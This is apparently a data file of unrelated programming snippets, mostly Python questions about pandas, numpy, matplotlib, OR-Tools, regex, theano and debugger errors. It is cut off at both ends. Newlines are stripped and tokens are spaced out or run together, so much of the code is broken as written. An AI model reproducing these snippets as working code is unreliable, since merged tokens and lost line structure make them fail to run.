[ 1 ] + 1 ) model.Add ( p2 [ 4 ] [ 1 ] == p2 [ 0 ] [ 1 ] + 2 ) # # 4th polyomino - > domino # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # p3 = pminos [ 3 ] model.Add ( p3 [ 1 ] [ 0 ] == p3 [ 0 ] [ 0 ] ) model.Add ( p3 [ 1 ] [ 1 ] == p3 [ 0 ] [ 1 ] + 1 ) # # 5th polyomino - > monomino # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # No constraints because 1 cell only # No blocks can overlap : block_addresses = [ ] n = 0 for p in pminos : for c in p : n += 1 block_address = model.NewIntVarFromDomain ( cp_model.Domain.FromIntervals ( ranges ) , ' % i ' % n ) model.Add ( c [ 0 ] + c [ 1 ] * W == block_address ) block_addresses.append ( block_address ) model.AddAllDifferent ( block_addresses ) # Solve and print solutions as we find them solver = cp_model.CpSolver ( ) solution_printer = SolutionPrinter ( pminos ) status = solver.SearchForAllSolutions ( model , solution_printer ) print ( 'Status = % s ' % solver.StatusName ( status ) ) print ( 'Number of solutions found : % i ' % solution_printer.count ) class SolutionPrinter ( cp_model.CpSolverSolutionCallback ) : `` ' Print a solution. `` ' def __init__ ( self , variables ) : cp_model.CpSolverSolutionCallback.__init__ ( self ) self.variables = variables self.count = 0 def on_solution_callback ( self ) : self.count += 1 plt.figure ( figsize = ( 2 , 2 ) ) plt.grid ( True ) plt.axis ( [ 0 , W , H,0 ] ) plt.yticks ( np.arange ( 0 , H , 1.0 ) ) plt.xticks ( np.arange ( 0 , W , 1.0 ) ) for i , p in enumerate ( self.variables ) : for c in p : x = self.Value ( c [ 0 ] ) y = self.Value ( c [ 1 ] ) rect = plt.Rectangle ( ( x , y ) , 1 , 1 , fc = cdict [ i ] ) plt.gca ( ) .add_patch ( rect ) for i in inactiveCells : x = i % W y = i//W rect = plt.Rectangle ( ( x , y ) , 1 , 1 , fc = 'None ' , hatch = '/// ' ) plt.gca ( ) .add_patch ( rect )"
^ [ abcd ] d+ hnbbaduduebbaef9f8 ; djfewskjcc98332f addr32bdfd09usdjcdddddd-9fdssee
"class Thing : def __init__ ( self , whatever ) : self.whatever = whateverx = Thing ( 'foo ' ) x.whatever class Thing : def __init__ ( self , whatever ) : self.whatever = whatever def getWhatever ( self ) : return self.whatever"
type ( s ) == str
"import re , inspect , datetimeinspect.getargspec ( re.findall ) # = > # ArgSpec ( args = [ 'pattern ' , 'string ' , 'flags ' ] , varargs=None , # keywords=None , defaults = ( 0 , ) ) type ( datetime.datetime.replace ) # = > < type 'method_descriptor ' > inspect.getargspec ( datetime.datetime.replace ) # = > Traceback ( most recent call last ) : # File `` < stdin > '' , line 1 , in < module > # File `` /usr/lib/python2.7/inspect.py '' , line 816 , in getargspec # raise TypeError ( ' { ! r } is not a Python function'.format ( func ) ) # TypeError : < method 'replace ' of 'datetime.datetime ' objects > is # not a Python function datetime.datetime.replace.__doc__ # = > 'Return datetime with new specified fields . '"
"a = np.array ( [ 1,2,3,5,7,10,13,16,20 ] ) pd.Series ( a ) 0 11 22 33 54 75 106 137 168 20 [ 1,2,3 ] , [ 5 ] , [ 7 ] , [ 10 ] , [ 13 ] , [ 16 ] , [ 20 ] [ 1,2,3,5,7 ] , [ 10 ] , [ 13 ] , [ 16 ] , [ 20 ] [ 1,2,3,5,7,10,13,16 ] , [ 20 ]"
if n in `` seq1 '' and `` something '' : ... if ( n in `` seq1 '' ) and `` something '' : ... for n in `` seq1 '' and `` something '' : ... for n in ( `` seq1 '' and `` something '' ) : ...
"> > > class B : ... print ( locals ( ) ) ... def foo ( self ) : ... print ( locals ( ) ) ... print ( __class__ in locals ( ) .values ( ) ) ... { '__module__ ' : '__main__ ' , '__qualname__ ' : ' B ' } > > > B ( ) .foo ( ) { '__class__ ' : < class '__main__.B ' > , 'self ' : < __main__.B object at 0x7fffe916b4a8 > } True NameError : name '__class__ ' is not defined"
"import numpy as npfrom mpl_toolkits.basemap import Basemapimport matplotlib.pyplot as pltfrom matplotlib.patches import Polygonfrom matplotlib.collections import PatchCollection % matplotlib inlinelandColor , coastColor , oceanColor , popColor , countyColor = ' # eedd99 ' , ' # 93ccfa ' , ' # 93ccfa ' , ' # ffee99 ' , ' # aa9955'fig = plt.figure ( ) ax = fig.add_subplot ( 111 ) s = 1900000m = Basemap ( projection='ortho ' , lon_0=-86.5 , lat_0=30.3 , resolution= ' l ' , llcrnrx=-s , llcrnry=-s , urcrnrx=s , urcrnry=s ) m.drawmapboundary ( fill_color=oceanColor ) # fill in the ocean # generic function for reading polygons from file and plotting them on the map . This works with Natural Earth shapes.def drawShapesFromFile ( filename , facecolor , edgecolor , m ) : m.readshapefile ( filename , 'temp ' , drawbounds = False ) patches = [ ] for info , shape in zip ( m.temp_info , m.temp ) : patches.append ( Polygon ( np.array ( shape ) , True ) ) ax.add_collection ( PatchCollection ( patches , facecolor=facecolor , edgecolor=edgecolor , linewidths=1 ) ) # read the higher resolution Natural Earth coastline ( land polygons ) shapefile and display it as a series of polygonsdrawShapesFromFile ( '\\Conda\\notebooks\\shapes\\ne_10m_coastline ' , landColor , coastColor , m ) drawShapesFromFile ( '\\Conda\\notebooks\\shapes\\ne_10m_urban_areas ' , popColor , 'none ' , m ) m.drawcounties ( color=countyColor ) plt.gcf ( ) .set_size_inches ( 10,10 )"
"following_companies_list_data = Company.query.filter ( Company.id.in_ ( [ ' 2 ' , '24 ' , ' 1 ' , ' 7 ' , '373 ' ] ) ) .paginate ( page , per_page=10 , error_out=False ) companies = following_companies_list_data.itemsfor i in companies : print i.id72437321"
Rank id0 1 a1 2 a2 3 a3 4 a4 5 a5 1 c6 2 c7 1 e8 2 e9 3 e Rank id0 1 a1 2 a2 3 a3 4 a4 5 a5 1 c6 2 c7 NaN c8 NaN c9 NaN c10 1 e11 2 e12 3 e13 NaN e14 NaN e
"import pandas as pdimport pyarrow as paimport pyarrow.parquet as pqdfs = [ ] df1 = pd.DataFrame ( data= { `` A '' : [ 1 , 2 , 3 ] , `` B '' : [ 4 , 5 , 6 ] } , columns= [ `` A '' , `` B '' ] ) df2 = pd.DataFrame ( data= { `` X '' : [ 1 , 2 ] , `` Y '' : [ 3 , 4 ] , `` Z '' : [ 5 , 6 ] } , columns= [ `` X '' , `` Y '' , `` Z '' ] ) dfs.append ( df1 ) dfs.append ( df2 ) for i in range ( 2 ) : table1 = pa.Table.from_pandas ( dfs [ i ] ) pq.write_table ( table1 , `` my_parq_ '' + str ( i ) + `` .parquet '' )"
nosetests -- with-coverage coverage report coverage report file_3.py
"( automl-meta-learning ) brandomiranda~/automl-meta-learning/automl/experiments ❯ env PTVSD_LAUNCHER_PORT=59729 /Users/brandomiranda/miniconda3/envs/automl-meta-learning/bin/python /Users/brandomiranda/.vscode/extensions/ms-python.python-2020.2.63072/pythonFiles/lib/python/new_ptvsd/wheels/ptvsd/launcher -m /Users/brandomiranda/automl-meta-learning/automl/experiments/experiments_model_optimization.py E+00000.025 : Error determining module path for sys.argv Traceback ( most recent call last ) : File `` /Users/brandomiranda/.vscode/extensions/ms-python.python-2020.2.63072/pythonFiles/lib/python/new_ptvsd/wheels/ptvsd/../ptvsd/server/cli.py '' , line 220 , in run_module spec = find_spec ( options.target ) File `` /Users/brandomiranda/miniconda3/envs/automl-meta-learning/lib/python3.7/importlib/util.py '' , line 94 , in find_spec parent = __import__ ( parent_name , fromlist= [ '__path__ ' ] ) ModuleNotFoundError : No module named '/Users/brandomiranda/automl-meta-learning/automl/experiments/experiments_model_optimization ' Stack where logged : File `` /Users/brandomiranda/miniconda3/envs/automl-meta-learning/lib/python3.7/runpy.py '' , line 193 , in _run_module_as_main `` __main__ '' , mod_spec ) File `` /Users/brandomiranda/miniconda3/envs/automl-meta-learning/lib/python3.7/runpy.py '' , line 85 , in _run_code exec ( code , run_globals ) File `` /Users/brandomiranda/.vscode/extensions/ms-python.python-2020.2.63072/pythonFiles/lib/python/new_ptvsd/wheels/ptvsd/__main__.py '' , line 45 , in < module > cli.main ( ) File `` /Users/brandomiranda/.vscode/extensions/ms-python.python-2020.2.63072/pythonFiles/lib/python/new_ptvsd/wheels/ptvsd/../ptvsd/server/cli.py '' , line 361 , in main run ( ) File `` /Users/brandomiranda/.vscode/extensions/ms-python.python-2020.2.63072/pythonFiles/lib/python/new_ptvsd/wheels/ptvsd/../ptvsd/server/cli.py '' , line 226 , in run_module log.exception ( `` Error determining module path for sys.argv '' ) /Users/brandomiranda/miniconda3/envs/automl-meta-learning/bin/python : Error while finding module specification for '/Users/brandomiranda/automl-meta-learning/automl/experiments/experiments_model_optimization.py ' ( ModuleNotFoundError : No module named '/Users/brandomiranda/automl-meta-learning/automl/experiments/experiments_model_optimization ' ) ( automl-meta-learning ) brandomiranda~/automl-meta-learning/automl/experiments ❯ python /Users/brandomiranda/automl-meta-learning/automl/experiments/experiments_model_optimization.py -- > main in differentiable SGD -- -- -- - > Inside Experiment Code < -- -- -- -- -- - > hostname : device = cpuFiles already downloaded and verifiedFiles already downloaded and verifiedFiles already downloaded and verified { // Use IntelliSense to learn about possible attributes . // Hover to view descriptions of existing attributes . // For more information , visit : https : //go.microsoft.com/fwlink/ ? linkid=830387 `` version '' : `` 0.2.0 '' , `` configurations '' : [ { `` name '' : `` Python : Experiments Protype1 '' , `` type '' : `` python '' , `` request '' : `` launch '' , `` module '' : `` $ { workspaceFolder } /automl/experiments/experiments_model_optimization.py '' // ~/automl-meta-learning/automl/experiments/experiments_model_optimization.py } , { `` name '' : `` Python : Current File ( Integrated Terminal ) '' , `` type '' : `` python '' , `` request '' : `` launch '' , `` program '' : `` $ { file } '' , `` console '' : `` integratedTerminal '' } , { `` name '' : `` Python : Remote Attach '' , `` type '' : `` python '' , `` request '' : `` attach '' , `` port '' : 5678 , `` host '' : `` localhost '' , `` pathMappings '' : [ { `` localRoot '' : `` $ { workspaceFolder } '' , `` remoteRoot '' : `` . '' } ] } , { `` name '' : `` Python : Module '' , `` type '' : `` python '' , `` request '' : `` launch '' , `` module '' : `` enter-your-module-name-here '' , `` console '' : `` integratedTerminal '' } , { `` name '' : `` Python : Django '' , `` type '' : `` python '' , `` request '' : `` launch '' , `` program '' : `` $ { workspaceFolder } /manage.py '' , `` console '' : `` integratedTerminal '' , `` args '' : [ `` runserver '' , `` -- noreload '' , `` -- nothreading '' ] , `` django '' : true } , { `` name '' : `` Python : Flask '' , `` type '' : `` python '' , `` request '' : `` launch '' , `` module '' : `` flask '' , `` env '' : { `` FLASK_APP '' : `` app.py '' } , `` args '' : [ `` run '' , `` -- no-debugger '' , `` -- no-reload '' ] , `` jinja '' : true } , { `` name '' : `` Python : Current File ( External Terminal ) '' , `` type '' : `` python '' , `` request '' : `` launch '' , `` program '' : `` $ { file } '' , `` console '' : `` externalTerminal '' } ] }"
00 19218.9657031 19247.6216502 19232.6513229 19279.21695610 19330.08737111 19304.316973 0 10 19218.965703 19279.216956 1 19247.621650 19330.0873712 19232.651322 19304.316973
The man likes math . He really does . he the man . The man likes math . The man really does . The man likes math . He really does .
"- MyProject - App1 - some_module1.py - some_module2.py - App2 - some_other_module1.py - some_other_module2.py INSTALLED_APPS = ( 'App1 ' , 'App2 ' , ) module_class = 'some_module1.SomeClass ' # Loop through each package in the INSTALLED_APPS tuple : for app in INSTALL_APPS : try : # is the module_class found in this app ? # App1.some_module1.SomeClass - Yes # App2.some_module1.SomeClass - No # is the class we found a subclass of Producer ? exception ImportError : pass"
open = lambda x : StringIO ( )
"_file_data = pd.read_csv ( _file , sep= '' , '' , header=0 , index_col= [ 'Date ' , 'Time ' ] , thousands= '' ' '' , parse_dates=True , skipinitialspace=True ) Date Time Volume2016-01-04 2018-04-25 09:01:29 53645 2018-04-25 10:01:29 123 2018-04-25 10:01:29 1345 ... .2016-01-05 2018-04-25 10:01:29 123 2018-04-25 12:01:29 213 2018-04-25 10:01:29 123"
"{ `` Sid '' : `` < some_random_id_for_this_permission '' , `` Effect '' : `` Allow '' , `` Principal '' : { `` Service '' : `` events.amazonaws.com '' } , `` Action '' : `` lambda : InvokeFunction '' , `` Resource '' : `` arn : aws : lambda : < some_arn_id > : function : _MyFunction '' , `` Condition '' : { `` ArnLike '' : { `` AWS : SourceArn '' : `` arn : aws : events < some_arn_id > : rule/my_rule_1 '' } }"
"re.sub ( r'\bAword\b ' , 'Bword ' , mystring ) re.sub ( r'\baword\b ' , 'bword ' , mystring ) re.sub ( r'\b ( [ Aa ] ) word\b ' , ' ( ? 1=A : B , a : b ) word ' )"
"for i in range ( 5 ) : print i for i in [ 0,1,2,3,4 ] : print i"
"df = pd.DataFrame ( { `` weather '' : [ 1,2,1,3 ] } ) df > > > weather0 11 22 13 3weather_correspondance_dict = { 1 : '' sunny '' , 2 : '' rainy '' , 3 : '' cloudy '' } df_vc = df.weather.value_counts ( ) index = df_vc.index.map ( lambda x : weather_correspondance_dict [ x ] ) df_vc.index = indexdf_vc > > > sunny 2cloudy 1rainy 1dtype : int64"
"config = pdfkit.configuration ( wkhtmltopdf= ' C : /wkhtmltopdf/bin/wkhtmltopdf.exe ' ) pdfgen = pdfkit.from_url ( url , printname , configuration=config ) pdf = open ( printname , 'rb ' ) response = HttpResponse ( pdf.read ( ) ) response [ 'Content-Type ' ] = 'application/pdf'response [ 'Content-disposition ' ] = 'attachment ; filename = ' + filenamepdf.close ( ) return response"
t = time.time ( ) action = str ( request.form [ 'action ' ] ) dt = time.time ( ) - t # Often 10 seconds or more !
"with open ( cert_file , `` r '' ) as f : x509 = OpenSSL.crypto.load_certificate ( OpenSSL.crypto.FILETYPE_PEM , f.read ( ) ) result = { 'subject ' : dict ( x509.get_subject ( ) .get_components ( ) ) , 'issuer ' : dict ( x509.get_issuer ( ) .get_components ( ) ) , 'serialNumber ' : x509.get_serial_number ( ) , 'version ' : x509.get_version ( ) , 'notBefore ' : datetime.strptime ( x509.get_notBefore ( ) , ' % Y % m % d % H % M % SZ ' ) , 'notAfter ' : datetime.strptime ( x509.get_notAfter ( ) , ' % Y % m % d % H % M % SZ ' ) , } extensions = ( x509.get_extension ( i ) for i in range ( x509.get_extension_count ( ) ) ) extension_data = { e.get_short_name ( ) : str ( e ) for e in extensions } result.update ( extension_data ) if result [ 'issuer ' ] [ 'CN ' ] == result [ 'subject ' ] [ 'CN ' ] : result.update ( { 'self-signed ' : True } ) else : result.update ( { 'self-signed ' : False } )"
"root @ raspberrypi : /media/pi/64D933A55CDD560F/PrinterSoftware # python MC.py [ INFO ] [ Logger ] Record log in /root/.kivy/logs/kivy_17-02-06_10.txt [ INFO ] [ Kivy ] v1.9.2.dev0 , git-57d41c9 , 20170206 [ INFO ] [ Python ] v2.7.9 ( default , Mar 8 2015 , 00:52:26 ) [ GCC 4.9.2 ] [ INFO ] [ Factory ] 193 symbols loaded [ INFO ] [ Image ] Providers : img_tex , img_dds , img_sdl2 , img_pil , img_gif ( img_ffpyplayer ignored ) [ INFO ] [ Text ] Provider : sdl2 [ INFO ] [ Window ] Provider : egl_rpi [ INFO ] [ GL ] Using the `` OpenGL ES 2 '' graphics system [ INFO ] [ GL ] Backend used < gl > [ INFO ] [ GL ] OpenGL version < OpenGL ES 2.0 > [ INFO ] [ GL ] OpenGL vendor < Broadcom > [ INFO ] [ GL ] OpenGL renderer < VideoCore IV HW > [ INFO ] [ GL ] OpenGL parsed version : 2 , 0 [ INFO ] [ GL ] Shading version < OpenGL ES GLSL ES 1.00 > [ INFO ] [ GL ] Texture max size < 2048 > [ INFO ] [ GL ] Texture max units < 8 > [ INFO ] [ Shader ] fragment shader : < Compiled > [ INFO ] [ Shader ] vertex shader : < Compiled > [ INFO ] [ Window ] virtual keyboard not allowed , single mode , not docked [ INFO ] [ OSC ] using < multiprocessing > for socket [ INFO ] [ ProbeSysfs ] device match : /dev/input/event0 [ INFO ] [ HIDInput ] Read event from < /dev/input/event0 > [ INFO ] [ ProbeSysfs ] device match : /dev/input/event1 [ INFO ] [ HIDInput ] Read event from < /dev/input/event1 > [ INFO ] [ ProbeSysfs ] device match : /dev/input/event2 [ INFO ] [ HIDInput ] Read event from < /dev/input/event2 > [ INFO ] [ HIDInput ] Read event from < /dev/input/event0 > [ INFO ] [ HIDInput ] Set custom invert_y to 0 [ INFO ] [ Base ] Start application main loop"
"Id other concat0 A z 11 A y 22 B x 33 B w 44 B v 55 B u 6 Id other concat new0 A z 1 [ 1 , 2 ] 1 A y 2 [ 1 , 2 ] 2 B x 3 [ 3 , 4 , 5 , 6 ] 3 B w 4 [ 3 , 4 , 5 , 6 ] 4 B v 5 [ 3 , 4 , 5 , 6 ] 5 B u 6 [ 3 , 4 , 5 , 6 ] import pandas as pddf = pd.DataFrame ( { 'Id ' : [ ' A ' , ' A ' , ' B ' , ' B ' , ' B ' , ' C ' ] , 'other ' : [ ' z ' , ' y ' , ' x ' , ' w ' , ' v ' , ' u ' ] , 'concat ' : [ 1,2,5,5,4,6 ] } ) df.groupby ( 'Id ' ) [ 'concat ' ] .apply ( list ) > > > df [ 'new_col ' ] = df.groupby ( 'Id ' ) [ 'concat ' ] .transform ( list ) > > > df Id concat other new_col0 A 1 z 11 A 2 y 22 B 5 x 53 B 5 w 54 B 4 v 45 C 6 u 6 > > > df [ 'new_col ' ] = df.groupby ( 'Id ' ) [ 'concat ' ] .apply ( list ) > > > df Id concat other new_col0 A 1 z NaN1 A 2 y NaN2 B 5 x NaN3 B 5 w NaN4 B 4 v NaN5 C 6 u NaN"
"def palindrom ( self ) : lowerself = re.sub ( `` [ , . ; : ? ! ] '' , `` '' , self.lower ( ) ) n = len ( lowerself ) for i in range ( n//2 ) : if lowerself [ i ] ! = lowerself [ n- ( i+1 ) ] : return False return True # more compactdef pythonicPalindrom ( self ) : lowerself = re.sub ( `` [ , . ; : ? ! ] '' , `` '' , self.lower ( ) ) lowerReversed = lowerself [ : :-1 ] if lowerself == lowerReversed : return True else : return False # with iteratordef iteratorPalindrom ( self ) : lowerself = re.sub ( `` [ , . ; : ? ! ] '' , `` '' , self.lower ( ) ) iteratorReverse = reversed ( lowerself ) for char in lowerself [ 0 : len ( lowerself ) //2 ] : if next ( iteratorReverse ) ! = char : return False return True"
if a in data : return Truereturn False
"import subprocessMYFILENAME = `` google_screen '' MYURL = `` www.google.com '' subprocess.Popen ( [ 'wget ' , '-O ' , MYFILENAME+'.png ' , 'http : //images.websnapr.com/ ? url='+MYURL+ ' & size=s & nocache=82 ' ] ) .wait ( )"
"d = { ' a ' : [ [ ( 'a1 ' , 1 , 1 ) , ( 'a2 ' , 1 , 2 ) ] ] , ' b ' : [ [ ( 'b1 ' , 2 , 1 ) , ( 'b2 ' , 2 , 2 ) ] ] } print ( d ) { ' b ' : [ [ ( 'b1 ' , 2 , 1 ) , ( 'b2 ' , 2 , 2 ) ] ] , ' a ' : [ [ ( 'a1 ' , 1 , 1 ) , ( 'a2 ' , 1 , 2 ) ] ] } [ ( ' b ' , 'b1 ' , 2 , 1 ) , ( ' b ' , 'b2 ' , 2 , 2 ) , ( ' a ' , 'a1 ' , 1 , 1 ) , ( ' a ' , 'a2 ' , 1 , 2 ) ] a = [ [ ( k , *y ) for y in v [ 0 ] ] for k , v in d.items ( ) ] a = [ item for sublist in a for item in sublist ]"
"d1 = pd.DataFrame ( { `` col1 '' : [ 1,2,3,4,5,6,7,8,9 ] , `` col2 '' : [ 5,4,3,2,5,43,2,5,6 ] , `` col3 '' : [ 10,10,10,10,10,4,10,10,10 ] } , index= [ `` paul '' , `` peter '' , `` lauren '' , `` dave '' , `` bill '' , `` steve '' , `` old-man '' , `` bob '' , `` tim '' ] ) d2 = pd.DataFrame ( { `` yes/no '' : [ 1,0,1,0,1,1,1,0,0 ] } , index= [ `` paul '' , `` peter '' , `` lauren '' , `` dave '' , `` bill '' , `` steve '' , `` old-man '' , `` bob '' , `` tim '' ] ) pd.concat ( ( d1 , d2 ) , axis=1 , join= '' outer '' ) itera = pd.read_csv ( `` test.csv '' , index_col= '' index '' , iterator=True , chunksize=2 ) for i in itera : d2 = pd.concat ( ( d2 , i ) , axis=1 , join= '' outer '' ) col1 col2 col3 yes/noone NaN NaN NaN 1.0two NaN NaN NaN 0.0three NaN NaN NaN 1.0four NaN NaN NaN 0.0five NaN NaN NaN 1.0six NaN NaN NaN 1.0seven NaN NaN NaN 1.0eight NaN NaN NaN 0.0nine NaN NaN NaN 0.0one 1.0 5.0 10.0 NaNtwo 2.0 4.0 10.0 NaNthree 3.0 3.0 10.0 NaNfour 4.0 2.0 10.0 NaNfive 5.0 5.0 10.0 NaNsix 6.0 43.0 4.0 NaNseven 7.0 2.0 10.0 NaNeight 8.0 5.0 10.0 NaNnine 9.0 6.0 10.0 NaN"
"class D ( object ) : `` The Descriptor '' def __init__ ( self , x = 1395 ) : self.x = x def __get__ ( self , instance , owner ) : print `` getting '' , self.x return self.xclass C ( object ) : d = D ( ) def __init__ ( self , d ) : self.d = d > > > c = C ( 4 ) > > > c.d4 class D ( object ) : '' The Descriptor '' def __init__ ( self , x = 1395 ) : self.x = x def __get__ ( self , instance , owner ) : print `` getting '' , self.x return self.x def __set__ ( self , instance , value ) : print `` setting '' , self.x self.x = valueclass C ( object ) : d = D ( ) def __init__ ( self , d ) : self.d = d > > > c=C ( 4 ) setting 1395 > > > c.dgetting 44"
"import timeitimport numpy as npdef func1 ( ) : x = np.arange ( 1000 ) sum = np.sum ( x*2 ) return sumdef func2 ( ) : sum = 0 for i in xrange ( 1000 ) : sum += i*2 return sumdef func3 ( ) : sum = 0 for i in xrange ( 0,1000,4 ) : x = np.arange ( i , i+4,1 ) sum += np.sum ( x*2 ) return sumprint timeit.timeit ( func1 , number = 1000 ) print timeit.timeit ( func2 , number = 1000 ) print timeit.timeit ( func3 , number = 1000 ) 0.01057291030880.0698649883270.983253955841 def func3 ( ) : sum = 0 x = np.arange ( 0,1000 ) for i in xrange ( 0,1000,4 ) : sum += np.sum ( x [ i : i+4 ] *2 ) return sum 0.01043081283570.06306099891660.748773813248 def func1 ( ) : x = np.arange ( 1000 ) x *= 2 return x.sum ( ) def func3 ( ) : sum = 0 x = np.arange ( 0,1000 ) for i in xrange ( 0,1000,4 ) : x [ i : i+4 ] *= 2 sum += x [ i : i+4 ] .sum ( ) return sum 0.008249998092650.06605696678160.598328828812"
"import numpy as npclass Test ( object ) : def __init__ ( self , iterable ) : self.data = iterable def __getitem__ ( self , idx ) : return self.data [ idx ] def __len__ ( self ) : return len ( self.data ) def __repr__ ( self ) : return ' { } ( { } ) '.format ( self.__class__.__name__ , self.data ) > > > np.array ( [ Test ( [ 1,2,3 ] ) , Test ( [ 3,2 ] ) ] , dtype=object ) array ( [ Test ( [ 1 , 2 , 3 ] ) , Test ( [ 3 , 2 ] ) ] , dtype=object ) > > > np.array ( [ Test ( [ 1,2,3 ] ) , Test ( [ 3,2,1 ] ) ] , dtype=object ) array ( [ [ 1 , 2 , 3 ] , [ 3 , 2 , 1 ] ] , dtype=object )"
"np.c_ [ [ 1,2 ] ] np.c_ [ ( 1,2 ) ] np.c_ [ ( 1,2 ) , ]"
"import pandas as pdpd.DataFrame ( { `` start '' : [ `` 2017-01-01 13:09:01 '' , `` 2017-01-01 13:09:07 '' , `` 2017-01-01 13:09:12 '' ] , `` end '' : [ `` 2017-01-01 13:09:05 '' , `` 2017-01-01 13:09:09 '' , `` 2017-01-01 13:09:14 '' ] , `` status '' : [ `` OK '' , `` ERROR '' , `` OK '' ] } ) | start | end | status || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- || 2017-01-01 13:09:01 | 2017-01-01 13:09:05 | OK || 2017-01-01 13:09:07 | 2017-01-01 13:09:09 | ERROR | | 2017-01-01 13:09:12 | 2017-01-01 13:09:14 | OK | | | status || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -|| 2017-01-01 13:09:01 | OK || 2017-01-01 13:09:02 | OK || 2017-01-01 13:09:03 | OK || 2017-01-01 13:09:04 | OK || 2017-01-01 13:09:05 | OK || 2017-01-01 13:09:06 | NAN || 2017-01-01 13:09:07 | ERROR || 2017-01-01 13:09:08 | ERROR || 2017-01-01 13:09:09 | ERROR || 2017-01-01 13:09:10 | NAN || 2017-01-01 13:09:11 | NAN || 2017-01-01 13:09:12 | OK || 2017-01-01 13:09:13 | OK || 2017-01-01 13:09:14 | OK |"
"ID date close1 09/15/07 123.452 06/01/08 130.133 10/25/08 132.014 05/13/09 118.345 11/07/09 145.996 11/15/09 146.737 07/03/11 171.10 ID date close1 09/15/07 123.453 10/25/08 132.015 11/07/09 145.997 07/03/11 171.10 ID date close1 09/15/07 123.452 06/01/08 130.133 10/25/08 132.014 05/13/09 118.345 11/07/09 145.997 07/03/11 171.10 filter_dates = [ ] for index , row in df.iterrows ( ) : if observation_time == 'D ' : for i in range ( 1 , observation_period ) : filter_dates.append ( ( index.date ( ) + timedelta ( days=i ) ) ) df = df [ ~df.index.isin ( filter_dates ) ]"
"4 26 5 19 4 5 3 15 4 08 3 4 [ ' 4 2 /n ' , ' 6 5 1 /n ' , ' 9 4 5 /n ' ] origianl = open ( file , ' r ' ) for line in original.readlines ( ) : newline = line.replace ( `` \n '' , '' '' ) finalWithStrings.append ( newline ) finalWithIntegers = [ map ( int , x ) for x in finalWithStrings ] finalWithIntegers [ : ] = [ x-1 for x in finalWithIntegers ] [ 3 , 5 , 8 ] for line in original.readlines ( ) : newline = line.replace ( `` \n '' , '' '' ) finalWithStrings.append ( newline ) finalWithIntegers = [ map ( int , x ) for x in finalWithStrings ] finalWithIntegers [ : ] = [ x-1 for x in finalWithIntegers ] ValueError : invalid literal for int ( ) with base 10 : ''"
"> > > a , b = '10 ' > > > a , b = map ( int , ( a , b ) ) > > > a , b = map ( bool , ( a , b ) ) > > > a , b ( True , False )"
"import numpy as npimport matplotlib.pyplot as pltfrom mpl_toolkits.axes_grid1 import make_axes_locatablex = np.random.normal ( 512 , 112 , 240 ) y = np.random.normal ( 0.5 , 0.1 , 240 ) _ , ax = plt.subplots ( ) divider = make_axes_locatable ( ax ) xhax = divider.append_axes ( `` top '' , size=1 , pad=0.1 , sharex=ax ) yhax = divider.append_axes ( `` right '' , size=1 , pad=0.1 , sharey=ax ) ax.scatter ( x , y ) xhax.hist ( x ) yhax.hist ( y , orientation= '' horizontal '' ) x0 , x1 = ax.get_xlim ( ) y0 , y1 = ax.get_ylim ( ) ax.set_aspect ( abs ( x1-x0 ) /abs ( y1-y0 ) ) plt.show ( ) ax.set_aspect ( abs ( x1-x0 ) /abs ( y1-y0 ) , share=True ) import numpy as npimport matplotlib.pyplot as pltimport matplotlib.gridspec as gridfrom mpl_toolkits.axes_grid1 import make_axes_locatable , axes_sizedef joint_plot ( x , y , ax=None ) : `` '' '' Create a square joint plot of x and y. `` '' '' if ax is None : ax = plt.gca ( ) divider = make_axes_locatable ( ax ) xhax = divider.append_axes ( `` top '' , size=1 , pad=0.1 , sharex=ax ) yhax = divider.append_axes ( `` right '' , size=1 , pad=0.1 , sharey=ax ) ax.scatter ( x , y ) xhax.hist ( x ) yhax.hist ( y , orientation= '' horizontal '' ) x0 , x1 = ax.get_xlim ( ) y0 , y1 = ax.get_ylim ( ) ax.set_aspect ( abs ( x1-x0 ) /abs ( y1-y0 ) ) plt.sca ( ax ) return ax , xhax , yhaxdef color_plot ( x , y , colors , ax=None ) : if ax is None : ax = plt.gca ( ) divider = make_axes_locatable ( ax ) cbax = divider.append_axes ( `` right '' , size= '' 5 % '' , pad=0.1 ) sc = ax.scatter ( x , y , marker= ' o ' , c=colors , cmap='RdBu ' ) plt.colorbar ( sc , cax=cbax ) ax.set_aspect ( `` equal '' ) plt.sca ( ax ) return ax , cbaxif __name__ == `` __main__ '' : _ , axes = plt.subplots ( nrows=2 , ncols=2 , figsize= ( 9,6 ) ) # Plot 1 x = np.random.normal ( 100 , 17 , 120 ) y = np.random.normal ( 0.5 , 0.1 , 120 ) joint_plot ( x , y , axes [ 0,0 ] ) # Plot 2 x = np.random.normal ( 100 , 17 , 120 ) y = np.random.normal ( 100 , 17 , 120 ) c = np.random.normal ( 100 , 17 , 120 ) color_plot ( x , y , c , axes [ 0,1 ] ) # Plot 3 x = np.random.normal ( 100 , 17 , 120 ) y = np.random.normal ( 0.5 , 0.1 , 120 ) c = np.random.uniform ( 0.0 , 1.0 , 120 ) color_plot ( x , y , c , axes [ 1,0 ] ) # Plot 4 x = np.random.normal ( 0.5 , 0.1 , 120 ) y = np.random.normal ( 0.5 , 0.1 , 120 ) joint_plot ( x , y , axes [ 1,1 ] ) plt.tight_layout ( ) plt.show ( )"
"def strip_accents ( s ) : return `` .join ( ( c for c in unicodedata.normalize ( 'NFD ' , s ) if unicodedata.category ( c ) ! = 'Mn ' ) )"
"import theanoimport theano.tensor as ttfrom scipy.integrate import quadx = tt.dscalar ( ' x ' ) y = x**4 # integrandf = theano.function ( [ x ] , y ) print f ( 0 ) print f ( 1 ) ans = integrate.quad ( f , 0 , 1 ) [ 0 ] print ans import numpy as npimport theanoimport theano.tensor as ttfrom scipy import integrateclass IntOp ( theano.Op ) : __props__ = ( ) def make_node ( self , x ) : x = tt.as_tensor_variable ( x ) return theano.Apply ( self , [ x ] , [ x.type ( ) ] ) def perform ( self , node , inputs , output_storage ) : x = inputs [ 0 ] z = output_storage [ 0 ] f_to_int = theano.function ( [ x ] , x ) z [ 0 ] = tt.as_tensor_variable ( integrate.quad ( f_to_int , 0 , 1 ) [ 0 ] ) def infer_shape ( self , node , i0_shapes ) : return i0_shapes def grad ( self , inputs , output_grads ) : ans = integrate.quad ( output_grads [ 0 ] , 0 , 1 ) [ 0 ] return [ ans ] intOp = IntOp ( ) x = tt.dmatrix ( ' x ' ) y = 